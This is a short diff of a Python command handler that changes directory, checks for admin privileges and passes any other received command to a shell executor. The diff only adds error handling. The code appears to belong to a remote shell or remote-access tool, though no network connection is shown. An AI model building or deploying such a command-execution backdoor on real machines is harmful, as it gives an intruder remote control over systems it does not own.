@@ -5,20 +5,24 @@ def handle_command(data):
 	arguments = " ".join(data.split()[1:])
 	if command == "test":
 		return test(arguments)
+		
 	elif command == "cd": # Change directory
 		try:
 			os.chdir(arguments) 
 			return ""
 		except Exception as e:
 			return str(e)
-			
+		
 	elif command == "isadmin":
 		if is_admin():
 			return "[+]Current process has admin privileges."
 		return "[-]Current process does not have admin privileges."
 		
 	else:
-		return execute_command(command + " " + arguments)
+		try:
+			return execute_command(command + " " + arguments)
+		except Exception as e:
+			return str(e)
 
 def execute_command(cmde): #Function to execute commands
 		if cmde:
